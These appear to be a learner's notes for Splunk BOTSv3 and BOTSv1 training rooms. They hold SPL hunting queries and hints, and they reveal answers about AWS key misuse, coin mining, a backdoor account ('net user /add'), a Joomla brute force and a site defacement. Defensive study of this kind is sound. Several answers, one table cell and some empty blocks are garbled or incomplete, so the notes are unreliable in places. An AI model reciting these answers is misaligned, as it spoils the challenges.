index=BOTSv3 vendor="Amazon Web Services" OR AWS
```

- field "userIdentity.userName" contains all four needed users

Refer to the following link to get an idea of what source type you need to query and what field in the results will have the answer you're seeking.

- **Link: https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-examples.html**

### Question 2

What field would you use to alert that AWS API activity has occurred without MFA (multi-factor authentication)? Answer guidance: Provide the full JSON path. (Example: iceCream.flavors.traditional)

- **Reference: https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-user-identity.html**
```spl
useridentity.sessioncontext.attributes.mfaauthenticated
```

The following links are provided to help you with this question.

- **Links:**

https://aws.amazon.com/premiumsupport/knowledge-center/s3-bucket-public-access/

https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudwatch-alarms-for-cloudtrail-additional-examples.html#cloudwatch-alarms-for-cloudtrail-no-mfa-example

Make sure you exclude events related to console logins.

It might be a good idea to do a keyword search query on this one. Don't forget to surround the keyword with asterisks.

Question 3: What is the processor number used on the web servers? Answer guidance: Include any special characters/punctuation. (Example: The processor number for Intel Core i7-8650U is i7-8650U.)

```spl
index=botsv3 sourcetype="osquery:results" INTEL OR AMD
```

Look at the source types available in the dataset. There might be one in particular that holds information on hardware, such as processors.

### Questions 4-6

A common misconfiguration involving AWS is publicly accessible S3 buckets. Read the following resource to understand ACLs and S3 buckets.

- **Link: https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketAcl.html**

Bud accidentally makes an S3 bucket publicly accessible. What is the event ID of the API call that enabled public access? Answer guidance: Include any special characters/punctuation.

#### What is Bud's username?

#### What is the name of the S3 bucket that was made publicly accessible?

```spl
index="botsv3" UserName=btun OR bstoll eventName=put*
```

### Question 7

You're tasked with identifying a text file uploaded to the S3 bucket. Here is a link for more information related to this topic.

- **Link: https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutObject.html**

Since you know the name of the S3 bucket, you should easily find the answer to this question.

You will need to query a different AWS-related source type. HTTP status code might be helpful as well.

What is the name of the text file that was successfully uploaded into the S3 bucket while it was publicly accessible? Answer guidance: Provide just the file name and extension, not the full path. (Example: filename.docx instead of /mylogs/web/filename.docx)

### Question 8

﻿What keywords can you start your search with to help identify what data sources can help you with this?

One of the fields within this source type clearly has the answer, but which is it?

Perhaps expanding upon your search to count on the operating systems and hosts will be helpful.

Answer the questions below

#### What is the FQDN of the endpoint that is running a different Windows operating system edition than the others?

```spl

```

```spl
index="botsv3" windows
```

```spl
| stats count by OS, host
```

```spl
| stats values(host) by OS
```

## More AWS events

### Question 1

You're tasked to identify which IAM user access key generates the most distinct errors when attempting to access IAM resources.

You should have an idea of which source type you'll need to query.

The question is, which field or fields you need to expand your query?

Below are links to aid you in this task.

- **Link:**

https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-record-contents.html

https://community.splunk.com/t5/Splunk-Search/How-can-I-retrieve-count-or-distinct-count-of-some-field-values/m-p/33619

Don't forget to surround the keyword with asterisks.

#### What IAM user access key generates the most distinct errors when attempting to access IAM resources?

```spl
index=botsv3 earliest=0 sourcetype="aws:cloudtrail" *error* eventSource=iam.amazonaws.com
```

```spl
| stats dc(errorMessage) by userIdentity.accessKeyId
```

```spl
| sort - dc(errorMessage)
```

### Questions 2-3

With the right source type and keyword, this event should jump right out at you, literally. You got this. :)

Bud accidentally commits AWS access keys to an external code repository. Shortly after, he receives a notification from AWS that the account had been compromised. What is the support case ID that Amazon opens on his behalf?

AWS access keys consist of two parts: an access key ID (e.g., AKIAIOSFODNN7EXAMPLE) and a secret access key (e.g., wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY). What is the secret access key of the key that was leaked to the external code repository?

Bud accidentally commits AWS access keys to an external code repository. Shortly after, he receives a notification from AWS that the account had been compromised. What is the support case ID that Amazon opens on his behalf?

```spl
index=botsv3 sourcetype="stream:smtp" access AND key
```

AWS access keys consist of two parts: an access key ID (e.g., AKIAIOSFODNN7EXAMPLE) and a secret access key (e.g., wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY). What is the secret access key of the key that was leaked to the external code repository?

- Answer this question by following the link to the Github commit mentioned in the email

### Question 4

The IAM user access key from question 1 will be helpful in this query.

After the results are returned, look at the fields that are available to you. With this field, expand on the query.

A link to help you with this task is below.

- **Link: https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateAccessKey.html**

Using the leaked key, the adversary makes an unauthorized attempt to create a key for a specific resource. What is the name of that resource? Answer guidance: One word.

```spl
index=botsv3 *AKIAJOGCDXJ5NW5PXUPA* eventName="CreateAccessKey"
```

### Question 5

The same IAM user access key, and a username, can help you here.

Use the event from the previous question to get the additional information needed, which is the username.

Using the leaked key, the adversary makes an unauthorized attempt to describe an account. What is the full user agent string of the application that originated the request?

| :>index=botsv3 *AKIAJOGCDXJ5NW5PXUPA* eventName=DescribeAccountAttributeskidh4kerus |  |
| --- | --- |

## Cryptomining events

Within this task, the questions are mostly focused on an endpoint browser and cryptomining events.

The questions below are from the 200 series of the BOTSv3 dataset.

### Questions 1-2

Again you're tasked to retrieve processor information, but this time it involves processor utilization.

Try some keywords related to processors and look at the available source types returned.

Start a new search query with the source type and look at the available fields.

Remember, you're looking for endpoints with 100% CPU utilization. Don't forget to reverse the order of the events.

A Frothly endpoint exhibits signs of coin mining activity. What is the name of the second process to reach 100 percent CPU processor utilization time from this activity on this endpoint? Answer guidance: Include any special characters/punctuation.

```spl
index=botsv3 sourcetype="PerfmonMk:Process" "%_Processor_Time"=100 "%_User_Time"=100
```

- the question asks for the "second" process. But this query results in a number of potential answers. Exclude the known / standard system and O/S stuff and the answers start to become clearer. It narrows down to three processes, two of which are chrome.

What is the short hostname of the only Frothly endpoint to actually mine Monero cryptocurrency? (Example: ahamilton instead of ahamilton.mycompany.com)

```spl
index=botsv3 *monero* OR *coin* host!="BTUN-L" host!=serverless host!="splunkhwf.froth.ly" host!="SEPM"
```

- after searching for monero or coin, it left five servers. So, process of elimination.

### Questions 3-6

You've already provided the source type. Look at the fields you wish to display in a table format and sort the events by time (sort + _time).

Below is a link to help you with Splunk event order functions.

- **Link: https://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Eventorderfunctions**

You'll be able to answer all the remaining questions from the events returned from this query. :)

Using Splunk's event order functions, what is the first seen signature ID of the coin miner threat according to Frothly's Symantec Endpoint Protection (SEP) data?

```spl
index=botsv3 sourcetype="symantec:ep:security:file" Begin_Time="2018-08-18 20:51:22"
```

- finding the sourcetype was easy enough. Then just added the earliest "Begin_time" which left only two possibilities: 30356 and 30358. There is no easily understandable reason why 30358 is the answer, but it is.

#### What is the name of the attack?

- **Answer:** JSCoinminerDownload6
- already in the results as "Web Attack"

According to Symantec's website, what is the severity of this specific coin miner threat?

- Reference: https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=30356
- note: even this website says the id is 30356
- **Answer:** Medium

What is the short hostname of the only Frothly endpoint to show evidence of defeating the cryptocurrency threat? (Example: ahamilton instead of ahamilton.mycompany.com)

- **Answer:** btun-l
- This was the only other frothly endpoint involved, other than bstoll-l

## Pivoting back to endpoint events

In this task, you'll focus on email-related and endpoint-related events.

The questions below are from the 300 series of the BOTSv3 dataset.

### Question 1

You're tasked to find the user agent that uploaded a malicious link file to OneDrive. You already know you have a source of antivirus; maybe that is a good place to start. Another starting point is Office 365. You might want to start there instead.

You know a file was uploaded, and you know its file extension. You have all you need. :)

#### What is the full user agent string that uploaded the malicious link file to OneDrive?

```spl
index=botsv3 vendor_product="Microsoft Cloud Services:OneDrive" | spath UserAgent | search UserAgent!="Microsoft Office PowerPoint 2014" Operation=FileUploaded
```

### Question 2

Now you're searching for a macro-enabled attachment. What file extensions are associated with macro-enabled documents?

You're looking for attachments, so you know you're looking for email-related events.

When using keywords, don't forget to use asterisks. I'm happy to say you should have this one too. :)

#### What was the name of the macro-enabled attachment identified as malware?

```spl
index=botsv3 sourcetype=wineventlog xlsm
```

- note: macro-enabled extensions change the file extension

### Question 3

This is picking up from the previous question. Once you discovered the attachment, you'll have the information you need to move forward with this question.

Careful of the source type that you use. Using the file extensions for macro-enabled documents will be useful here.

After the query executes, look at the fields closely, the answer might be there.

What is the name of the executable that was embedded in the malware? Answer guidance: Include the file extension. (Example: explorer.exe)

```spl
index=botsv3 *xlsm TargetFilename="C:\\Users\\BruceGist\\AppData\\Local\\Packages\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\LocalState\\Files\\S0\\3\\Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm"
```

### Question 4

Knowledge of Linux is needed for this. What commands are associated with creating accounts? In logs, how is the root user identified?

The answers to these questions will prove useful when constructing your search query.

You might be able to find the answer without an explicitly defined source type in your query. Search the returned events carefully.

#### What is the password for the user that was successfully created by the user "root" on the on-premises Linux system?

```spl
index=botsv3 sourcetype="osquery:results"| spath "columns.path" | search "columns.path"="/usr/sbin/useradd"
```

### Questions 5-6

The same principles apply to this question, but you don't know if the endpoint is Windows or Linux. Using very generic keywords might be wise here.

The amount of returned events will be fairly large. It would help if you expanded your search query by excluding source types that you are confident are not relevant to your search.

You should be able to move from here and answer the next question. :)

#### What is the name of the user that was created after the endpoint was compromised?

```spl
index=botsv3 source="WinEventLog:Security" net AND user AND "/add"
```

"C:\Windows\system32\net.exe" user/addsvcvncPassword123!

Based on the previous question, what groups was this user assigned to after the endpoint was compromised? Answer guidance: Comma separated without spaces, in alphabetical order.

### Question 7

The word "leet" is noted. What are numerical values associated with this phrase?

The amount of returned events might be a bit much. Another keyword might be useful to add to your search to help shrink the number of events returned. What about these numerical values are you searching for?

#### What is the process ID of the process listening on a "leet" port?

```spl
index=botsv3 sourcetype="osquery:results" 1337| spath "columns.pid" | search "columns.pid"!=1337
```

### Question 8

Some useful bits of information for this task: Fyodor's machine name and an event code associated with network connections.

The number of returned events will be large, but the unusual binary pops right at you by inspecting the available fields.

#### What is the MD5 value of the file downloaded to Fyodor's endpoint system and used to scan Frothly's network?

```spl
index=botsv3 source="WinEventLog:Microsoft-Windows-Sysmon/Operational" host="FYODOR-L" process=* md5 direction=inbound app="C:\\Windows\\Temp\\hdoor.exe"
```

Also used "stats count by app" which shows the instance of hdoor inside the Temp folder.

## More endpoint events

### Question 1 & 2

A lot of malicious activity has occurred on Fyodor's endpoint. You can start your search with his host.

Downloads can involve various protocols: HTTP, TCP, FTP, etc. Depending on the protocol, you might need to add an operation, such as FTP & RETR.

If you go this route, the suspected port should be noticeable in the Available Fields.

There are a couple of different paths you can take for this question.

#### What port number did the adversary use to download their attack tools?

```spl
index=botsv3 host="fyodor-l" sourcetype="stream:tcp" dest_port=*
```

Based on the information gathered for question 1, what file can be inferred to contain the attack tools? Answer guidance: Include the file extension.

```spl
index=botsv3 host="fyodor-l" dest_port=3333
```

### Question 3

This one might take some work. You're provided with a starting point, /tmp directory. Don't forget the asterisks, /tmp/*.*.

Review the data returned; you'll need to exclude source types to help narrow down the search.

Additionally, add a keyword to help shrink the returned results even further.

There are a few suspect files. Two of them, in particular, are the correct answer.

During the attack, two files are remotely streamed to the /tmp directory of the on-premises Linux server by the adversary. What are the names of these files? Answer guidance: Comma separated without spaces, in alphabetical order, include the file extension where applicable.

```spl
index=botsv3 sourcetype="osquery:results" | spath "columns.action" | search "columns.action"=CREATED "decorations.username"=tomcat8 | spath "columns.target_path" | regex "columns.target_path"= "\.[a-zA-Z0-9]{2}$"
```

The answers are: colonel.c,definitelydontinvestigatethisfile.sh

- so the regex helped find the file extensions

### Question 4

An email was sent to Grace Hoppy. Honestly, you have enough here to find this answer. :)

The question lies on what source type to include or exclude in your search query.

The Taedonggang adversary sent Grace Hoppy an email bragging about the successful exfiltration of customer data. How many Frothly customer emails were exposed or revealed?

### Question 5-6

Tackling this one will require some work too. To point you in the right direction, PowerShell Logging & some decoding will help you with this one.

Once you've found the events with the attacker payloads, you'll have enough to build a search query for question #6.

What is the path of the URL being accessed by the command and control server? Answer guidance: Provide the full path. (Example: The full path for the URL https://imgur.com/a/mAqgt4S/lasd3.jpg is /a/mAqgt4S/lasd3.jpg)

Reference beacon detection:

http://findingbad.blogspot.com/2020/05/hunting-for-beacons-part-2.html

```spl
|
```

At least two Frothly endpoints contact the adversary's command and control infrastructure. What are their short hostnames? Answer guidance: Comma separated without spaces, in alphabetical order.

## Incident Handling Life Cycle

![Incident Handling Life Cycle](assets/splunk-bots-128.png)

As an Incident Handler / SOC Analyst, we would aim to know the attackers' tactics, techniques, and procedures.

Then we can stop/defend/prevent against the attack in a better way.

The Incident Handling process is divided into four different phases.

Let's briefly go through each phase before jumping into the incident, which we will be going through in this exercise.

### 1. Preparation

The preparation phase covers the readiness of an organization against an attack. That means documenting the requirements, defining the policies, incorporating the security controls to monitor like EDR / SIEM / IDS / IPS, etc. It also includes hiring/training the staff.

### 2. Detection and Analysis

The detection phase covers everything related to detecting an incident and the analysis process of the incident. This phase covers getting alerts from the security controls like SIEM/EDR investigating the alert to find the root cause. This phase also covers hunting for the unknown threat within the organization.

### 3. Containment, Eradication, and Recovery

This phase covers the actions needed to prevent the incident from spreading and securing the network. It involves steps taken to avoid an attack from spreading into the network, isolating the infected host, clearing the network from the infection traces, and gaining control back from the attack.

### 4. Post-Incident Activity / Lessons Learnt

This phase includes identifying the loopholes in the organization's security posture, which led to an intrusion, and improving so that the attack does not happen next time. The steps involve identifying weaknesses that led to the attack, adding detection rules so that similar breach does not happen again, and most importantly, training the staff if required.

From <https://tryhackme.com/room/splunk201>

## Incident Handling: Scenario

In this exercise, we will investigate a cyber attack in which the attacker defaced an organization's website.

This organization has Splunk as a SIEM solution setup.

Our task as a Security Analyst would be to investigate this cyber attack and map the attacker's activities into all 7 of the Cyber Kill Chain Phases.

It is important to note that we don't need to follow the sequence of the cyber kill chain during the investigation.

One finding in one phase will lead to another finding that may have mapped into some other phase.

## Cyber Kill Chain

We will follow the Cyber kill Chain Model and map the attacker's activity in each phase during this investigation.

When required, we will also utilize Open Source Intelligence (OSINT) and other findings to fill the gaps in the kill chain.

It is not necessary to follow this sequence of the phases while investigating.

Reconnaissance

## Weaponization

## Delivery

Exploitation

Installation

Command & Control

Actions on Objectives

## Scenario

A Big corporate organization Wayne Enterprises has recently faced a cyber-attack where the attackers broke into their network, found their way to their web server, and have successfully defaced their website http://www.imreallynotbatman.com.

Their website is now showing the trademark of the attackers with the message YOUR SITE HAS BEEN DEFACED as shown below.

![Scenario](assets/splunk-bots-129.png)

They have requested "US" to join them as a Security Analyst and help them investigate this cyber attack and find the root cause and all the attackers' activities within their network.

The good thing is, that they have Splunk already in place, so we have got all the event logs related to the attacker's activities captured.

We need to explore the records and find how the attack got into their network and what actions they performed.

This investigation comes under theDetection and Analysis phase.

## Splunk

During our investigation, we will be using Splunk as our SIEM solution.

Logs are being ingested from webserver/firewall/Suricata/Sysmon etc.

In the data summary tab, we can explore the log sources showing visibility into both network-centric and host-centric activities.

To get the complete picture of the hosts and log sources being monitored in Wayne Enterprise, please click on the Data summary and navigate the available tabs to get the information.

![Splunk](assets/splunk-bots-130.png)

## Interesting log Sources

Some of the interesting log sources that will help us in our investigation are:

| Log Sources | Details |
| --- | --- |
| wineventlog | It contains Windows Event logs |
| winRegistry | It contains the logs related to registry creation / modification / deletion etc. |
| XmlWinEventLog | It contains the sysmon event logs. It is a very important log source from an investigation point of view. |
| fortigate_utm | It contains Fortinet Firewall logs |
| iis | It contains IIS web server logs |
| Nessus:scan | It contains the results from the Nessus vulnerability scanner. |
| Suricata | It contains the details of the alerts from the Suricata IDS. This log source shows which alert was triggered and what caused the alert to get triggered— a very important log source for the investigation. |
| stream:http | It contains the network flow related to http traffic. |
| stream: DNS | It contains the network flow related to DNS traffic. |
| stream:icmp | It contains the network flow related to icmp traffic. |

> **Note:** All the event logs that we are going to investigate are present in index=botsv1

Now that we know what hosts we have to investigate, what sources and the source types are, let's connect to the lab and start Investigating.

From <https://tryhackme.com/room/splunk201>

## Reconnaissance Phase

![Reconnaissance Phase](assets/splunk-bots-131.png)

Reconnaissance is an attempt to discover and collect information about a target.

It could be knowledge about the system in use, the web application, employees or location, etc.

We will start our analysis by examining any reconnaissance attempt against the webserver imreallynotbatman.com.

From an analyst perspective, where do we first need to look?

If we look at the available log sources, we will find some log sources covering the network traffic, which means all the inbound communication towards our web server will be logged into the log source that contains the web traffic.

Let's start by searching for the domain in the search head and see which log source includes the traces of our domain.

- **Search Query:**
```spl
index=botsv1 imreallynotbatman.com
```

- **Search Query explanation:** We are going to look for the event logs in the index "botsv1" which contains the term imreallynotbatman.com

![Reconnaissance Phase](assets/splunk-bots-132.png)

Here we have searched for the term imreallynotbatman.com in the index botsv1.

In the sourcetype field, we saw that the following log sources contain the traces of this search term.

Suricata

stream:http

fortigate_utm

iis

From the name of these log sources, it is clear what each log source may contain.

Every analyst may have a different approach to investigating a scenario.

Our first task is to identify the IP address attempting to perform reconnaissance activity on our web server.

It would be obvious to look at the web traffic coming into the network.

We can start looking into any of the logs mentioned above sources.

Let us begin looking at the log source stream:http, which contains the http traffic logs, and examine the src_ip field from the left panel.

Src_ip field contains the source IP address it finds in the logs.

- **Search Query:**
```spl
index=botsv1 imreallynotbatman.com sourcetype=stream:http
```

- **Search Query Explanation:** This query will only look for the term imreallynotbatman.com in the stream:http log source.

![Reconnaissance Phase](assets/splunk-bots-133.png)

> **Note:** The important thing to note, if you don't find the field of interest, keep scrolling in the left panel. When you click on a field, it will contain all the values it finds in the logs.

So far, we have found two IPs in the src_ip field 40.80.148.42 and 23.22.63.114.

The first IP seems to contain a high percentage of the logs as compared to the other IP, which could be the answer.

If you want to confirm further, click on each IP one by one, it will be added into the search query, and look at the logs, and you will find the answer.

To further confirm our suspicion about the IP address 40.80.148.42, click on the IP and examine the logs.

We can look at the interesting fields like User-Agent, Post request, URIs, etc., to see what kind of traffic is coming from this particular IP.

![Reconnaissance Phase](assets/splunk-bots-134.png)

We have narrowed down the results to only show the logs from the source IP 40.80.148.42, looked at the fields of interest and found the traces of the domain being probed.

### Validate the IP that is scanning

So what do we need to do to validate the scanning attempt?

Simple, dig further into the weblogs.

Let us narrow down the result, look into the suricata logs, and see if any rule is triggered on this communication.

- **Search Query:**
```spl
index=botsv1 imreallynotbatman.com src=40.80.148.42 sourcetype=suricata
```

- **Search Query Explanation:** This query will show the logs from the suricata log source that are detected/generated from the source IP 40.80.248.42

![Validate the IP that is scanning](assets/splunk-bots-135.png)

We have narrowed our search on the src IP and looked at the source type suricata to see what Suricata triggered alerts.

In the right panel, we could not find the field of our interest, so we clicked on more fields and searched for the fields that contained the signature alerts information, which is an important point to note.

Answer the questions below

One suricata alert highlighted the CVE value associated with the attack attempt. What is the CVE value?

```spl
index=botsv1 sourcetype="suricata" alert.signature="*CVE-*"
```

#### What is the CMS our web server is using?

```spl
index=botsv1 sourcetype="suricata" http.status=200
```

- Along the sides there is an interesting field "http.hostname" which contained Joomla...

#### What is the web scanner, the attacker used to perform the scanning attempts?

```spl
index=botsv1 src_ip="40.80.148.42"
```

- looking through fields and "acunetix" was in there.
- acunetix is a vulnerability scanner

#### What is the IP address of the server imreallynotbatman.com?

```spl
index=botsv1 imreallynotbatman.com http.status=200 "http.hostname"="imreallynotbatman.com"
```

- source_ip showed the answer

## Exploitation Phase

The attacker needs to exploit the vulnerability to gain access to the system/server.

In this task, we will look at the potential exploitation attempt from the attacker against our web server and see if the attacker got successful in exploiting or not.

To begin our investigation, let's note the information we have so far:

We found two IP addresses from the reconnaissance phase with sending requests to our server.

One of the IPs 40.80.148.42 was seen attempting to scan the server with IP 192.168.250.70.

The attacker was using the web scanner Acunetix for the scanning attempt.

### Count

Let's use the following search query to see the number of counts by each source IP against the webserver.

- **Search Query:**
```spl
index=botsv1 imreallynotbatman.com sourcetype=stream* | stats count(src_ip) as Requests by src_ip | sort - Requests
```

- **Query Explanation:** This query uses the stats function to display the count of the IP addresses in the field src_ip.

![Count](assets/splunk-bots-136.png)

Additionally, we can also create different visualization to show the result. Click on Visualization → Select Visualization as shown below.

![Count](assets/splunk-bots-137.png)

Now we will narrow down the result to show requests sent to our web server, which has the IP 192.168.250.70

- **Search Query:**
```spl
index=botsv1 sourcetype=stream:http dest_ip="192.168.250.70"
```

- **Query Explanation:** This query will look for all the inbound traffic towards IP 192.168.250.70.

![Count](assets/splunk-bots-138.png)

The result in the src_ip field shows three IP addresses (1 local IP and two remote IPs) that originated the HTTP traffic towards our webserver.

Another interesting field, http_method will give us information about the HTTP Methods observed during these HTTP communications.

We observed most of the requests coming to our server through the POST request, as shown below.

```spl
index=botsv1 sourcetype=stream* dest_ip=192.168.250.70 | stats count(http_method) as methods by http_method | sort -methods
```

![Count](assets/splunk-bots-139.png)

To see what kind of traffic is coming through the POST requests, we will narrow down on the field http_method=POST as shown below:

- **Search Query:**
```spl
index=botsv1 sourcetype=stream:http dest_ip="192.168.250.70" http_method=POST
```

![Count](assets/splunk-bots-140.png)

﻿

The result in the src_ip field shows two IP addresses sending all the POST requests to our server.

Interesting fields: In the left panel, we can find some interesting fields containing valuable information. Some of the fields are:

src_ip

form_data

http_user_agent

Uri

![Count](assets/splunk-bots-141.png)

The term Joomla is associated with the webserver found in a couple of fields like uri, uri_path, http_referrer, etc.

This means our webserver is using Joomla CMS (Content Management Service) in the backend.

A little search on the internet for the admin login page of the Joomla CMS will show as -> /joomla/administrator/index.php

It is important because this uri contains the login page to access the web portal therefore we will be examining the traffic coming into this admin panel for a potential brute-force attack.

![Count](assets/splunk-bots-142.png)

- **Reference: https://www.joomla.org/administrator/index.php**

We can narrow down our search to see the requests sent to the login portal using this information.

- **Search query:**
```spl
index=botsv1 imreallynotbatman.com sourcetype=stream:http dest_ip="192.168.250.70" uri="/joomla/administrator/index.php"
```

- **Query Explanation:** We are going to add uri="/joomla/administrator/index.php" in the search query to show the traffic coming into this URI.

![Count](assets/splunk-bots-143.png)

form_data The field contains the requests sent through the form on the admin panel page, which has a login page.

We suspect the attacker may have tried multiple credentials in an attempt to gain access to the admin panel.

To confirm, we will dig deep into the values contained within the form_data field, as shown below:

- **Search Query:**
```spl
index=botsv1 sourcetype=stream:http dest_ip="192.168.250.70" http_method=POST uri="/joomla/administrator/index.php" | table _time uri src_ip dest_ip form_data
```

- **Query Explanation:** We will add this -> | table _time uri src dest_ip form_data to create a table containing important fields as shown below:

![Count](assets/splunk-bots-144.png)

If we keep looking at the results, we will find two interesting fields username that includes the single username admin in all the events and another field passwd that contains multiple passwords in it, which shows the attacker from the IP 23.22.63.114 Was trying to guess the password by brute-forcing and attempting numerous passwords.

The time elapsed between multiple events also suggests that the attacker was using an automated tool as various attempts were observed in a short time.

### Extracting Username and Passwd Fields using Regex

Looking into the logs, we see that these fields are not parsed properly.

Let us use Regex in the search to extract only these two fields and their values from the logs and display them.

We can display only the logs that contain the username and passwd values in the form_data field by adding form_data=*username*passwd* in the above search.

- **Search Query:**
```spl
index=botsv1 sourcetype=stream:http dest_ip="192.168.250.70" http_method=POST uri="/joomla/administrator/index.php" form_data=*username*passwd* | table _time uri src_ip dest_ip form_data
```

![Extracting Username and Passwd Fields using Regex](assets/splunk-bots-145.png)

It's time to use Regex (regular expressions) to extract all the password values found against the field passwd in the logs. To do so, Splunk has a function called rex. If we type it in the search head, it will show detail and an example of how to use it to extract the values.

![Extracting Username and Passwd Fields using Regex](assets/splunk-bots-146.png)

Now, let's use Regex. rex field=form_data "passwd=(?<creds>\w+)" To extract the passwd values only. This will pick the form_data field and extract all the values found with the field. creds.

- **Search Query:**
```spl
index=botsv1 sourcetype=stream:http dest_ip="192.168.250.70" http_method=POST form_data=*username*passwd* | rex field=form_data "passwd=(?<creds>\w+)" | table src_ip creds
```

![Extracting Username and Passwd Fields using Regex](assets/splunk-bots-147.png)

We have extracted the passwords being used against the username admin on the admin panel of the webserver.

If we examine the fields in the logs, we will find two values against the field http_user_agent as shown below:

![Extracting Username and Passwd Fields using Regex](assets/splunk-bots-148.png)

The first value clearly shows attacker used a python script to automate the brute force attack against our server.

But one request came from a Mozilla browser. WHY?

To find the answer to this query, let's slightly change to the about search query and add http_user_agent a field in the search head.

Let's create a table to display key fields and values by appending -> | table _time src_ip uri http_user_agent creds in the search query as shown below.

- **Search Query:**
```spl
index=botsv1 sourcetype=stream:http dest_ip="192.168.250.70" http_method=POST form_data=*username*passwd* | rex field=form_data "passwd=(?<creds>\w+)" |table _time src_ip uri http_user_agent creds
```

![Extracting Username and Passwd Fields using Regex](assets/splunk-bots-149.png)

This result clearly shows a continuous brute-force attack attempt from an IP 23.22.63.114 and 1 password attempt batman from IP 40.80.148.42 using the Mozilla browser.

Answer the questions below

#### What was the URI which got multiple brute force attempts?

```spl
index=botsv1 dest_ip="192.168.250.70" uri="/joomla/administrator/index.php" form_data=*username*passwd* | rex field=form_data "passwd=(?<creds>\w+)"
```

```spl
| table creds uri dest_headers form_data http_user_agent
```

```spl
| sort -creds
```

- **Answer:** /joomla/administrator.index.php

#### Against which username was the brute force attempt made?

- Admin

#### What was the correct password for admin access to the content management system running imreallynotbatman.com?

This is a combination effort. You have to do the query to find the search but finding the successful login means identifing the actual login, not a response from the server. You look for the password also used to login. The brute force attack is observed by the http_user_agent that includes the python library. The login is shows by the http_user_agent with an actual browser

- **Answer:** batman

#### How many unique passwords were attempted in the brute force attempt?

- There were 413 events. One of these was the successful login
- **Answer:** 412

#### What IP address is likely attempting a brute force password attack against imreallynotbatman.com?

- add "src_ip" to the table in the search
- **Answer:** 23.22.63.114

#### After finding the correct password, which IP did the attacker use to log in to the admin panel?

- just added "batman" before the "rex" search
- **Answer:** 40.80.148.42

## Installation Phase

Once the attacker has successfully exploited the security of a system, he will try to install a backdoor or an application for persistence or to gain more control of the system.

This activity comes under the installation phase.

In the previous Exploitation phase, we found evidence of the webserver iamreallynotbatman.com getting compromised via brute-force attack by the attacker using the python script to automate getting the correct password.

The attacker used the IP" for the attack and the IP to log in to the server.

This phase will investigate any payload / malicious program uploaded to the server from any attacker's IPs and installed into the compromised server.

To begin an investigation, we first would narrow down any http traffic coming into our server 192.168.250.70 containing the term ".exe." This query may not lead to the findings, but it's good to start from 1 extension and move ahead.

- **Search Query:**
```spl
index=botsv1 sourcetype=stream:http dest_ip="192.168.250.70" *.exe
```

![Installation Phase](assets/splunk-bots-150.png)

With the search query in place, we are looking for the fields that could have some values of our interest.

As we could not find the file name field, we looked at the missing fields and saw a field. part_filename{}.

Observing the interesting fields and values, we can see the field part_filename{} contains the two file names. an executable file 3791.exe and a PHP file agent.php

![Installation Phase](assets/splunk-bots-151.png)

Next, we need to find if any of these files came from the IP addresses that were found to be associated with the attack earlier.

Click on the file name; it will be added to the search query, then look for the field c_ip, which seems to represent the client IP.

- **Search Query:**
```spl
index=botsv1 sourcetype=stream:http dest_ip="192.168.250.70" "part_filename{}"="3791.exe"
```

![Installation Phase](assets/splunk-bots-152.png)

### Was this file executed on the server after being uploaded?

We have found that file 3791.exe was uploaded on the server.

The question that may come to our mind would be, was this file executed on the server?

We need to narrow down our search query to show the logs from the host-centric log sources to answer this question.

- **Search Query:**
```spl
index=botsv1 "3791.exe"
```

![Was this file executed on the server after being uploaded?](assets/splunk-bots-153.png)

Following the Host-centric log, sources were found to have traces of the executable 3791. exe.

Sysmon

WinEventlog

fortigate_utm

For the evidence of execution, we can leverage sysmon and look at the EventCode=1 for program execution.

- **Reference: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon**

![Was this file executed on the server after being uploaded?](assets/splunk-bots-154.png)

- **Search Query:**
```spl
index=botsv1 "3791.exe" sourcetype="XmlWinEventLog" EventCode=1
```

- **Query Explanation:** This query will look for the process Creation logs containing the term "3791.exe" in the logs.

![Was this file executed on the server after being uploaded?](assets/splunk-bots-155.png)

Looking at the output, we can clearly say that this file was executed on the compromised server.

We can also look at other host-centric log sources to confirm the result.

Answer the questions below

Sysmon also collects the Hash value of the processes being created. What is the MD5 HASH of the program 3791.exe?

Looking at the logs, which user executed the program 3791.exe on the server?

Search hash on the virustotal. What other name is associated with this file 3791.exe?

## Action on Objective

![Action on Objective](assets/splunk-bots-156.png)

As the website was defaced due to a successful attack by the adversary, it would be helpful to understand better what ended up on the website that caused defacement.

As an analyst, our first quest could be to figure out the traffic flow that could lead us to the answer to this question. There can be a different approach to finding the answer to this question. We will start our investigation by examining the Suricata log source and the IP addresses communicating with the webserver 192.168.250.70.

- **Search Query:**
```spl
index=botsv1 dest=192.168.250.70 sourcetype=suricata
```

![Action on Objective](assets/splunk-bots-157.png)

The logs do not show any external IP communicating with the server. Let us change the flow direction to see if any communication originates from the server.

- **Search Query:**
```spl
index=botsv1 src=192.168.250.70 sourcetype=suricata
```

![Action on Objective](assets/splunk-bots-158.png)

What is interesting about the output? Usually, the web servers do not originate the traffic. The browser or the client would be the source, and the server would be the destination. Here we see three external IPs towards which our web server initiates the outbound traffic. There is a large chunk of traffic going to these external IP addresses, which could be worth checking.

Pivot into the destination IPs one by one to see what kind of traffic/communication is being carried out.

- **Search Query:**
```spl
index=botsv1 src=192.168.250.70 sourcetype=suricata dest_ip=23.22.63.114
```

![Action on Objective](assets/splunk-bots-159.png)

The URL field shows 2 PHP files and one jpeg file. This jpeg file looks interesting. Let us change the search query and see where this jpeg file came from.

- **Search Query:**
```spl
index=botsv1 url="/poisonivy-is-coming-for-you-batman.jpeg" dest_ip="192.168.250.70" | table _time src dest_ip http.hostname url
```

![Action on Objective](assets/splunk-bots-160.png)

The end result clearly shows a suspicious jpeg poisonivy-is-coming-for-you-batman.jpeg was downloaded from the attacker's host prankglassinebracket.jumpingcrab.com that defaced the site.

![Action on Objective](assets/splunk-bots-161.png)

Answer the questions below

#### What is the name of the file that defaced the imreallynotbatman.com website ?

